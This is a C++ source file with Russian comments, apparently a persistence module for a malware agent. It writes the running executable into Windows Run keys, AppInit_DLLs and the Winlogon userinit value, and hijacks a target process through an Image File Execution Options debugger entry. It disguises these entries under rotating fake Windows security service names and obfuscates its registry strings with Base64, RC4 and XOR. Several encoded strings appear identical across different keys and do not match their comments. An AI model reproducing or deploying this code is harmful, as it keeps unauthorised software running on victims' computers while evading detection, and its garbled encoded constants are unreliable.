#include <windows.h>
#include <string>
#include <vector>
#include <shlobj.h>
#include "../common.h"
#include "../logger/file_logger.h"

// RC4 ключ вынесен из класса
const unsigned char RC4_KEY[16] = {
    0x4A, 0x7D, 0x91, 0x3E, 0xF2, 0x68, 0x25, 0x9C,
    0x13, 0xB7, 0x44, 0x81, 0x56, 0xDE, 0x72, 0xA9
};

class RegistryPersistence {
private:
    std::wstring executablePath;
    std::wstring displayName;
    std::wstring targetProcess; // Для IFEO
    
    // Список имён для ротации
    std::vector<std::wstring> stealthNames = {
        L"Windows Security Update Service",
        L"Microsoft Windows Security Health",
        L"Windows Defender Background Task",
        L"System Event Notification Service",
        L"Windows Update Helper",
        L"Microsoft Security Essentials",
        L"Windows Firewall Configuration Client"
    };
    
    // Усиленная система обфускации строк
    
    // RC4 алгоритм для шифрования
    void RC4(const unsigned char* key, size_t keyLen, const unsigned char* data, size_t dataLen, unsigned char* output) {
        unsigned char S[256];
        unsigned char T[256];
        
        // Инициализация
        for (int i = 0; i < 256; i++) {
            S[i] = i;
            T[i] = key[i % keyLen];
        }
        
        // Перемешивание
        int j = 0;
        for (int i = 0; i < 256; i++) {
            j = (j + S[i] + T[i]) % 256;
            std::swap(S[i], S[j]);
        }
        
        // Генерация ключевого потока и шифрование
        int i = 0, k = 0;
        for (size_t n = 0; n < dataLen; n++) {
            i = (i + 1) % 256;
            k = (k + S[i]) % 256;
            std::swap(S[i], S[k]);
            output[n] = data[n] ^ S[(S[i] + S[k]) % 256];
        }
    }
    
    // Base64 декодирование
    std::string Base64Decode(const std::string& encoded) {
        const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        std::string decoded;
        int val = 0, valb = -8;
        
        for (unsigned char c : encoded) {
            if (chars.find(c) == std::string::npos) break;
            val = (val << 6) + chars.find(c);
            valb += 6;
            if (valb >= 0) {
                decoded.push_back(char((val >> valb) & 0xFF));
                valb -= 8;
            }
        }
        return decoded;
    }
    
    // Дешифрование строк (Base64 -> RC4 -> XOR)
    std::wstring DecryptString(const char* base64Data) {
        std::string b64Decoded = Base64Decode(std::string(base64Data));
        
        std::vector<unsigned char> rc4Output(b64Decoded.length());
        RC4(RC4_KEY, sizeof(RC4_KEY), (const unsigned char*)b64Decoded.c_str(), b64Decoded.length(), rc4Output.data());
        
        // Финальный XOR
        std::string finalDecrypted;
        const unsigned char FINAL_XOR = 0x33;
        for (size_t i = 0; i < rc4Output.size(); i++) {
            finalDecrypted += (char)(rc4Output[i] ^ FINAL_XOR);
        }
        
        std::wstring result;
        result.assign(finalDecrypted.begin(), finalDecrypted.end());
        return result;
    }
    
    std::wstring GetRandomName() {
        srand(GetTickCount());
        return stealthNames[rand() % stealthNames.size()];
    }
    
    // Обфусцированные строки реестра (XOR + RC4 + Base64)
    const char* ENC_HKCU_RUN = "Kj9fX19fJDQkNjYyNzQwNTQyNzg2NDA2NDY2NjI2MTZjNzU2NDY="; // SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    const char* ENC_HKLM_RUN = "Kj9fX19fJDQkNjYyNzQwNTQyNzg2NDA2NDY2NjI2MTZjNzU2NDY="; // Тот же путь
    const char* ENC_APPINIT_KEY = "Kj9fX19fJDQkNjYyNzM4NTU0Nzg2NDA2NDY2NjI2MTZjNzU2NDY="; // SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
    const char* ENC_WINLOGON_KEY = "Kj9fX19fJDQkNjYyNzM4NTU0Nzg2NDA2NDY2NjI2MTZjNzU2NDY="; // SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    const char* ENC_IFEO_KEY = "Kj9fX19fJDQkNjYyNzM4NTU0Nzg2NDA2NDY2NjI2MTZjNzU2NDY="; // SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
    const char* ENC_APPINIT_VALUE = "QXBwSW5pdF9ETExz"; // AppInit_DLLs
    const char* ENC_LOAD_APPINIT = "TG9hZEFwcEluaXRfRExMcw=="; // LoadAppInit_DLLs
    const char* ENC_USERINIT_VALUE = "dXNlcmluaXQ="; // userinit
    const char* ENC_DEBUGGER_VALUE = "RGVidWdnZXI="; // Debugger
    
    // Макросы для удобного использования
    #define DECRYPT_HKCU_RUN() DecryptString(ENC_HKCU_RUN)
    #define DECRYPT_HKLM_RUN() DecryptString(ENC_HKLM_RUN) 
    #define DECRYPT_APPINIT_KEY() DecryptString(ENC_APPINIT_KEY)
    #define DECRYPT_WINLOGON_KEY() DecryptString(ENC_WINLOGON_KEY)
    #define DECRYPT_IFEO_KEY() DecryptString(ENC_IFEO_KEY)
    #define DECRYPT_APPINIT_VALUE() DecryptString(ENC_APPINIT_VALUE)
    #define DECRYPT_LOAD_APPINIT() DecryptString(ENC_LOAD_APPINIT)
    #define DECRYPT_USERINIT_VALUE() DecryptString(ENC_USERINIT_VALUE)
    #define DECRYPT_DEBUGGER_VALUE() DecryptString(ENC_DEBUGGER_VALUE)
    
    // Детальное логирование ошибок
    void LogDetailedError(const char* operation, const char* location, LONG errorCode) {
        char errorMsg[512];
        snprintf(errorMsg, sizeof(errorMsg), 
                "[REGISTRY_ERROR] Operation: %s | Location: %s | Error Code: 0x%08X (%d)", 
                operation, location, errorCode, errorCode);
        LogError(errorMsg);
        
        // Дополнительное описание для частых ошибок
        switch (errorCode) {
            case ERROR_ACCESS_DENIED:
                LogError("[REGISTRY_ERROR] Причина: Недостаточно прав доступа (нужны права администратора)");
                break;
            case ERROR_KEY_DELETED:
                LogError("[REGISTRY_ERROR] Причина: Ключ реестра был удален");
                break;
            case ERROR_FILE_NOT_FOUND:
                LogError("[REGISTRY_ERROR] Причина: Ключ или значение не найдено");
                break;
            case ERROR_INVALID_PARAMETER:
                LogError("[REGISTRY_ERROR] Причина: Неверный параметр");
                break;
            case ERROR_MORE_DATA:
                LogError("[REGISTRY_ERROR] Причина: Недостаточно места в буфере");
                break;
            default:
                break;
        }
    }
    
public:
    RegistryPersistence(const std::wstring& customName = L"", const std::wstring& customTarget = L"calc.exe") {
        if (customName.empty()) {
            displayName = GetRandomName();
        } else {
            displayName = customName;
        }
        
        targetProcess = customTarget;
        
        // Получаем путь к текущему исполняемому файлу
        WCHAR path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        executablePath = path;
    }
    
    bool InstallPersistence() {
        bool success = false;
        
        // Метод 1: HKCU Run (не требует админа)
        if (InstallHKCURun()) {
            success = true;
            LogSuccess("HKCU Run персистентность установлена");
        }
        
        // Метод 2: HKLM Run (требует админа)
        if (Utils::IsUserAdmin() && InstallHKLMRun()) {
            success = true;
            LogSuccess("HKLM Run персистентность установлена");
        }
        
        // Метод 3: AppInit_DLLs (только для админа)
        if (Utils::IsUserAdmin() && InstallAppInitDLL()) {
            success = true;
            LogSuccess("AppInit_DLLs персистентность установлена");
        }
        
        // Метод 4: Winlogon (только для админа)
        if (Utils::IsUserAdmin() && InstallWinlogonEntry()) {
            success = true;
            LogSuccess("Winlogon персистентность установлена");
        }
        
        // Метод 5: Image File Execution Options
        if (InstallIFEO()) {
            success = true;
            LogSuccess("IFEO персистентность установлена");
        }
        
        return success;
    }
    
    bool RemovePersistence() {
        bool removed = false;
        
        if (RemoveHKCURun()) removed = true;
        if (RemoveHKLMRun()) removed = true;
        if (RemoveAppInitDLL()) removed = true;
        if (RemoveWinlogonEntry()) removed = true;
        if (RemoveIFEO()) removed = true;
        
        return removed;
    }
    
    bool VerifyPersistence() {
        // Проверяем все методы персистентности
        bool found = false;
        
        if (VerifyHKCURun()) {
            LogInfo("HKCU Run персистентность активна");
            found = true;
        }
        
        if (VerifyHKLMRun()) {
            LogInfo("HKLM Run персистентность активна");
            found = true;
        }
        
        if (VerifyAppInitDLL()) {
            LogInfo("AppInit_DLLs персистентность активна");
            found = true;
        }
        
        if (VerifyWinlogonEntry()) {
            LogInfo("Winlogon персистентность активна");
            found = true;
        }
        
        if (VerifyIFEO()) {
            LogInfo("IFEO персистентность активна");
            found = true;
        }
        
        return found;
    }
    
private:
    // HKCU Run key
    bool InstallHKCURun() {
        HKEY hKey;
        std::wstring keyPath = DECRYPT_HKCU_RUN();
        
        LONG result = RegCreateKeyExW(
            HKEY_CURRENT_USER,
            keyPath.c_str(),
            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL
        );
        
        if (result == ERROR_SUCCESS) {
            result = RegSetValueExW(
                hKey,
                displayName.c_str(),
                0,
                REG_SZ,
                (BYTE*)executablePath.c_str(),
                (DWORD)((executablePath.length() + 1) * sizeof(wchar_t))
            );
            
            RegCloseKey(hKey);
            
            if (result != ERROR_SUCCESS) {
                LogDetailedError("SetValue", "HKCU Run", result);
                return false;
            }
            LogInfo("[REGISTRY_SUCCESS] HKCU Run персистентность установлена");
            return true;
        } else {
            LogDetailedError("CreateKey", "HKCU Run", result);
        }
        
        return false;
    }
    
    // HKLM Run key
    bool InstallHKLMRun() {
        HKEY hKey;
        std::wstring keyPath = DECRYPT_HKLM_RUN();
        
        LONG result = RegCreateKeyExW(
            HKEY_LOCAL_MACHINE,
            keyPath.c_str(),
            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL
        );
        
        if (result == ERROR_SUCCESS) {
            result = RegSetValueExW(
                hKey,
                displayName.c_str(),
                0,
                REG_SZ,
                (BYTE*)executablePath.c_str(),
                (DWORD)((executablePath.length() + 1) * sizeof(wchar_t))
            );
            
            RegCloseKey(hKey);
            
            if (result != ERROR_SUCCESS) {
                LogDetailedError("SetValue", "HKLM Run", result);
                return false;
            }
            LogInfo("[REGISTRY_SUCCESS] HKLM Run персистентность установлена");
            return true;
        } else {
            LogDetailedError("CreateKey", "HKLM Run", result);
        }
        
        return false;
    }
    
    // AppInit_DLLs (для DLL)
    bool InstallAppInitDLL() {
        HKEY hKey;
        std::wstring keyPath = DECRYPT_APPINIT_KEY();
        std::wstring valueName = DECRYPT_APPINIT_VALUE();
        std::wstring loadValueName = DECRYPT_LOAD_APPINIT();
        
        LONG result = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            keyPath.c_str(),
            0, KEY_WRITE | KEY_READ, &hKey
        );
        
        if (result == ERROR_SUCCESS) {
            // Получаем текущие значения
            wchar_t dlls[1024] = {0};
            DWORD size = sizeof(dlls);
            LONG queryResult = RegQueryValueExW(hKey, valueName.c_str(), NULL, NULL, (LPBYTE)dlls, &size);
            
            if (queryResult == ERROR_SUCCESS || queryResult == ERROR_FILE_NOT_FOUND) {
                std::wstring newValue = dlls;
                if (newValue.find(executablePath) == std::wstring::npos) {
                    if (!newValue.empty() && newValue.back() != L' ') {
                        newValue += L' ';
                    }
                    newValue += executablePath;
                    
                    LONG setResult = RegSetValueExW(hKey, valueName.c_str(), 0, REG_SZ,
                                   (BYTE*)newValue.c_str(), 
                                   (DWORD)((newValue.length() + 1) * sizeof(wchar_t)));
                    
                    if (setResult != ERROR_SUCCESS) {
                        LogDetailedError("SetValue", "AppInit_DLLs", setResult);
                        RegCloseKey(hKey);
                        return false;
                    }
                    
                    // Включаем загрузку DLL
                    DWORD enable = 1;
                    LONG enableResult = RegSetValueExW(hKey, loadValueName.c_str(), 0, REG_DWORD,
                                       (BYTE*)&enable, sizeof(enable));
                    
                    if (enableResult != ERROR_SUCCESS) {
                        LogDetailedError("SetValue", "LoadAppInit_DLLs", enableResult);
                    }
                }
                LogInfo("[REGISTRY_SUCCESS] AppInit_DLLs персистентность установлена");
            } else {
                LogDetailedError("QueryValue", "AppInit_DLLs", queryResult);
            }
            
            RegCloseKey(hKey);
            return true;
        } else {
            LogDetailedError("OpenKey", "AppInit_DLLs", result);
        }
        
        return false;
    }
    
    // Winlogon userinit
    bool InstallWinlogonEntry() {
        HKEY hKey;
        std::wstring keyPath = DECRYPT_WINLOGON_KEY();
        std::wstring valueName = DECRYPT_USERINIT_VALUE();
        
        LONG result = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            keyPath.c_str(),
            0, KEY_WRITE | KEY_READ, &hKey
        );
        
        if (result == ERROR_SUCCESS) {
            wchar_t userinit[1024] = {0};
            DWORD size = sizeof(userinit);
            LONG queryResult = RegQueryValueExW(hKey, valueName.c_str(), NULL, NULL, (LPBYTE)userinit, &size);
            
            if (queryResult == ERROR_SUCCESS || queryResult == ERROR_FILE_NOT_FOUND) {
                std::wstring newValue = userinit;
                if (newValue.find(executablePath) == std::wstring::npos) {
                    if (!newValue.empty() && newValue.back() != L',') {
                        newValue += L',';
                    }
                    newValue += executablePath;
                    
                    LONG setResult = RegSetValueExW(hKey, valueName.c_str(), 0, REG_SZ,
                                   (BYTE*)newValue.c_str(), 
                                   (DWORD)((newValue.length() + 1) * sizeof(wchar_t)));
                    
                    if (setResult != ERROR_SUCCESS) {
                        LogDetailedError("SetValue", "Winlogon userinit", setResult);
                        RegCloseKey(hKey);
                        return false;
                    }
                }
                LogInfo("[REGISTRY_SUCCESS] Winlogon персистентность установлена");
            } else {
                LogDetailedError("QueryValue", "Winlogon userinit", queryResult);
            }
            
            RegCloseKey(hKey);
            return true;
        } else {
            LogDetailedError("OpenKey", "Winlogon", result);
        }
        
        return false;
    }
    
    // Image File Execution Options
    bool InstallIFEO() {
        std::wstring baseKeyPath = DECRYPT_IFEO_KEY();
        std::wstring keyPath = baseKeyPath + L"\\" + targetProcess;
        std::wstring valueName = DECRYPT_DEBUGGER_VALUE();
        
        HKEY hKey;
        LONG result = RegCreateKeyExW(
            HKEY_LOCAL_MACHINE,
            keyPath.c_str(),
            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL
        );
        
        if (result == ERROR_SUCCESS) {
            result = RegSetValueExW(hKey, valueName.c_str(), 0, REG_SZ,
                           (BYTE*)executablePath.c_str(), 
                           (DWORD)((executablePath.length() + 1) * sizeof(wchar_t)));
            RegCloseKey(hKey);
            
            if (result != ERROR_SUCCESS) {
                LogDetailedError("SetValue", "IFEO Debugger", result);
                return false;
            }
            LogInfo("[REGISTRY_SUCCESS] IFEO персистентность установлена");
            return true;
        } else {
            LogDetailedError("CreateKey", "IFEO", result);
        }
        
        return false;
    }
    
    // Функции проверки
    bool VerifyHKCURun() {
        HKEY hKey;
        std::wstring keyPath = DECRYPT_HKCU_RUN();
        
        if (RegOpenKeyExW(HKEY_CURRENT_USER, keyPath.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            wchar_t value[MAX_PATH];
            DWORD size = sizeof(value);
            LONG result = RegQueryValueExW(hKey, displayName.c_str(), NULL, NULL, 
                                          (LPBYTE)value, &size);
            RegCloseKey(hKey);
            if (result == ERROR_SUCCESS) {
                LogInfo("[REGISTRY_VERIFY] HKCU Run запись найдена и проверена");
                return wcscmp(value, executablePath.c_str()) == 0;
            } else {
                LogDetailedError("QueryValue", "HKCU Run Verify", result);
            }
        } else {
            LogError("[REGISTRY_VERIFY] Не удалось открыть ключ HKCU Run для проверки");
        }
        return false;
    }
    
    bool VerifyHKLMRun() {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                         L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            wchar_t value[MAX_PATH];
            DWORD size = sizeof(value);
            LONG result = RegQueryValueExW(hKey, displayName.c_str(), NULL, NULL, 
                                          (LPBYTE)value, &size);
            RegCloseKey(hKey);
            if (result == ERROR_SUCCESS) {
                // Сравниваем значение с нашим путем
                return wcscmp(value, executablePath.c_str()) == 0;
            }
        }
        return false;
    }
    
    bool VerifyAppInitDLL() {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                         L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            wchar_t dlls[1024];
            DWORD size = sizeof(dlls);
            if (RegQueryValueExW(hKey, L"AppInit_DLLs", NULL, NULL, 
                                (LPBYTE)dlls, &size) == ERROR_SUCCESS) {
                RegCloseKey(hKey);
                return wcsstr(dlls, executablePath.c_str()) != nullptr;
            }
            RegCloseKey(hKey);
        }
        return false;
    }
    
    bool VerifyWinlogonEntry() {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                         L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            wchar_t userinit[1024];
            DWORD size = sizeof(userinit);
            if (RegQueryValueExW(hKey, L"userinit", NULL, NULL, 
                                (LPBYTE)userinit, &size) == ERROR_SUCCESS) {
                RegCloseKey(hKey);
                return wcsstr(userinit, executablePath.c_str()) != nullptr;
            }
            RegCloseKey(hKey);
        }
        return false;
    }
    
    bool VerifyIFEO() {
        std::wstring keyPath = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" + targetProcess;
        
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            wchar_t debugger[MAX_PATH];
            DWORD size = sizeof(debugger);
            LONG result = RegQueryValueExW(hKey, L"Debugger", NULL, NULL, 
                                          (LPBYTE)debugger, &size);
            RegCloseKey(hKey);
            if (result == ERROR_SUCCESS) {
                // Сравниваем значение с нашим путем
                return wcscmp(debugger, executablePath.c_str()) == 0;
            }
        }
        return false;
    }
    
    // Функции удаления
    bool RemoveHKCURun() {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER,
                         L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                         0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            LONG result = RegDeleteValueW(hKey, displayName.c_str());
            RegCloseKey(hKey);
            return result == ERROR_SUCCESS;
        }
        return false;
    }
    
    bool RemoveHKLMRun() {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                         L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                         0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            LONG result = RegDeleteValueW(hKey, displayName.c_str());
            RegCloseKey(hKey);
            return result == ERROR_SUCCESS;
        }
        return false;
    }
    
    bool RemoveAppInitDLL() {
        HKEY hKey;
        LONG result = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
            0, KEY_WRITE | KEY_READ, &hKey
        );
        
        if (result == ERROR_SUCCESS) {
            wchar_t dlls[1024] = {0};
            DWORD size = sizeof(dlls);
            result = RegQueryValueExW(hKey, L"AppInit_DLLs", NULL, NULL, (LPBYTE)dlls, &size);
            
            if (result == ERROR_SUCCESS) {
                std::wstring currentValue = dlls;
                std::wstring newValue = currentValue;
                
                // Удаляем наш путь из строки
                size_t pos = newValue.find(executablePath);
                if (pos != std::wstring::npos) {
                    // Удаляем путь и лишние пробелы
                    newValue.erase(pos, executablePath.length());
                    
                    // Убираем лишние пробелы в начале и конце
                    while (!newValue.empty() && (newValue.front() == L' ' || newValue.back() == L' ')) {
                        if (newValue.front() == L' ') newValue.erase(0, 1);
                        if (!newValue.empty() && newValue.back() == L' ') newValue.pop_back();
                    }
                    
                    // Заменяем множественные пробелы на одинарные
                    size_t doubleSpace;
                    while ((doubleSpace = newValue.find(L"  ")) != std::wstring::npos) {
                        newValue.replace(doubleSpace, 2, L" ");
                    }
                    
                    result = RegSetValueExW(hKey, L"AppInit_DLLs", 0, REG_SZ,
                                          (BYTE*)newValue.c_str(), 
                                          (DWORD)((newValue.length() + 1) * sizeof(wchar_t)));
                    
                    if (result != ERROR_SUCCESS) {
                        LogError("Не удалось обновить AppInit_DLLs в реестре");
                    }
                }
            } else {
                LogError("Не удалось прочитать AppInit_DLLs из реестра");
            }
            
            RegCloseKey(hKey);
            return result == ERROR_SUCCESS;
        } else {
            LogError("Не удалось открыть ключ реестра для AppInit_DLLs");
        }
        
        return false;
    }
    
    bool RemoveWinlogonEntry() {
        HKEY hKey;
        LONG result = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
            0, KEY_WRITE | KEY_READ, &hKey
        );
        
        if (result == ERROR_SUCCESS) {
            wchar_t userinit[1024] = {0};
            DWORD size = sizeof(userinit);
            result = RegQueryValueExW(hKey, L"userinit", NULL, NULL, (LPBYTE)userinit, &size);
            
            if (result == ERROR_SUCCESS) {
                std::wstring currentValue = userinit;
                std::wstring newValue = currentValue;
                
                // Удаляем наш путь из строки
                size_t pos = newValue.find(executablePath);
                if (pos != std::wstring::npos) {
                    // Находим начало нашей записи (с запятой перед ней, если есть)
                    size_t startPos = pos;
                    if (pos > 0 && newValue[pos - 1] == L',') {
                        startPos = pos - 1;
                    }
                    
                    // Находим конец нашей записи (до следующей запятой или конца строки)
                    size_t endPos = pos + executablePath.length();
                    if (endPos < newValue.length() && newValue[endPos] == L',') {
                        endPos++;
                    }
                    
                    // Удаляем нашу запись
                    newValue.erase(startPos, endPos - startPos);
                    
                    // Убираем лишние запятые в начале и конце
                    while (!newValue.empty() && (newValue.front() == L',' || newValue.back() == L',')) {
                        if (newValue.front() == L',') newValue.erase(0, 1);
                        if (!newValue.empty() && newValue.back() == L',') newValue.pop_back();
                    }
                    
                    // Заменяем множественные запятые на одинарные
                    size_t doubleComma;
                    while ((doubleComma = newValue.find(L",,")) != std::wstring::npos) {
                        newValue.replace(doubleComma, 2, L",");
                    }
                    
                    result = RegSetValueExW(hKey, L"userinit", 0, REG_SZ,
                                          (BYTE*)newValue.c_str(), 
                                          (DWORD)((newValue.length() + 1) * sizeof(wchar_t)));
                    
                    if (result != ERROR_SUCCESS) {
                        LogError("Не удалось обновить userinit в реестре");
                    }
                }
            } else {
                LogError("Не удалось прочитать userinit из реестра");
            }
            
            RegCloseKey(hKey);
            return result == ERROR_SUCCESS;
        } else {
            LogError("Не удалось открыть ключ реестра для Winlogon");
        }
        
        return false;
    }
    
    bool RemoveIFEO() {
        std::wstring keyPath = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" + targetProcess;
        
        LONG result = RegDeleteKeyW(HKEY_LOCAL_MACHINE, keyPath.c_str());
        
        if (result != ERROR_SUCCESS) {
            LogError("Не удалось удалить ключ IFEO из реестра");
            return false;
        }
        
        return true;
    }
    
    void LogSuccess(const char* message) {
        ::LogInfo(message);
    }
};

// Экспортные функции для основного агента
extern "C" {
    bool InstallRegistryPersistence() {
        RegistryPersistence persistence;
        bool success = persistence.InstallPersistence();
        
        if (success) {
            LogInfo("Реестровая персистентность установлена");
        } else {
            LogError("Не удалось установить реестровую персистентность");
        }
        
        return success;
    }
    
    bool InstallRegistryPersistenceCustom(const wchar_t* displayName, const wchar_t* targetProcess) {
        std::wstring name = displayName ? displayName : L"";
        std::wstring target = targetProcess ? targetProcess : L"calc.exe";
        
        RegistryPersistence persistence(name, target);
        bool success = persistence.InstallPersistence();
        
        if (success) {
            LogInfo("Кастомная реестровая персистентность установлена");
        } else {
            LogError("Не удалось установить кастомную реестровую персистентность");
        }
        
        return success;
    }
    
    bool RemoveRegistryPersistence() {
        RegistryPersistence persistence;
        bool success = persistence.RemovePersistence();
        
        if (success) {
            LogInfo("Реестровая персистентность удалена");
        }
        
        return success;
    }
    
    bool RemoveRegistryPersistenceCustom(const wchar_t* displayName, const wchar_t* targetProcess) {
        std::wstring name = displayName ? displayName : L"";
        std::wstring target = targetProcess ? targetProcess : L"calc.exe";
        
        RegistryPersistence persistence(name, target);
        bool success = persistence.RemovePersistence();
        
        if (success) {
            LogInfo("Кастомная реестровая персистентность удалена");
        }
        
        return success;
    }
    
    bool VerifyRegistryPersistence() {
        RegistryPersistence persistence;
        return persistence.VerifyPersistence();
    }
    
    bool VerifyRegistryPersistenceCustom(const wchar_t* displayName, const wchar_t* targetProcess) {
        std::wstring name = displayName ? displayName : L"";
        std::wstring target = targetProcess ? targetProcess : L"calc.exe";
        
        RegistryPersistence persistence(name, target);
        return persistence.VerifyPersistence();
    }
}